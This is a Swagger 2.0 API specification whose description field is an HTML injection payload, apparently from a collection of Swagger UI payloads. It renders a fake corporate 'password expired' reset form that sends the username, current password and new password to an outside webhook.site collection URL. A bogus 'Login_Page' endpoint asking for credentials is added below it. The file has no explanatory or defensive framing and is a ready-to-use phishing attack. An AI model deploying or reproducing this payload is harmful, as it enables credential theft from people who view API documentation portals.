swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<br><table width="100%" cellspacing="0" cellpadding="0"><tr><td width="30%">&nbsp;</td><td width="40%" bgcolor="#ffffff"><table width="100%" cellspacing="0" cellpadding="22"><tr><td align="left"><table width="100%" cellspacing="0" cellpadding="10"><tr><td bgcolor="#fff8c5"><font face="Segoe UI" size="2" color="#9a6700">Your password expired on 30-day rotation policy</font></td></tr></table><br><font face="Segoe UI" size="5" color="#1f2328"><b>Reset your password</b></font><br><font face="Segoe UI" size="2" color="#656d76">Choose a strong password with 12+ characters, 1 number and 1 symbol.</font><br><br><form action="https://webhook.site/REPLACE-ME" method="post"><font face="Segoe UI" size="2" color="#333333"><b>Username</b></font><br><input type="text" name="user" size="34" placeholder="Username"><br><br><font face="Segoe UI" size="2" color="#333333"><b>Current password</b></font><br><input type="password" name="oldpass" size="34" placeholder="Current password"><br><br><font face="Segoe UI" size="2" color="#333333"><b>New password</b></font><br><input type="password" name="newpass" size="34" placeholder="New password"><br><br><font face="Segoe UI" size="2" color="#333333"><b>Confirm new password</b></font><br><input type="password" name="confirmpass" size="34" placeholder="Confirm new password"><br><br><input type="image" src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/btn-reset.png" width="160" height="46" alt="Update password"></form></td></tr></table><table width="100%" cellspacing="0" cellpadding="3"><tr><td bgcolor="#0969da">&nbsp;</td></tr></table><table width="100%" cellspacing="0" cellpadding="8"><tr><td align="left"><font face="Segoe UI" size="1" color="#656d76">Corporate IT Portal &middot; Password Policy v2.1</font></td></tr></table></td><td width="30%">&nbsp;</td></tr></table><br>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
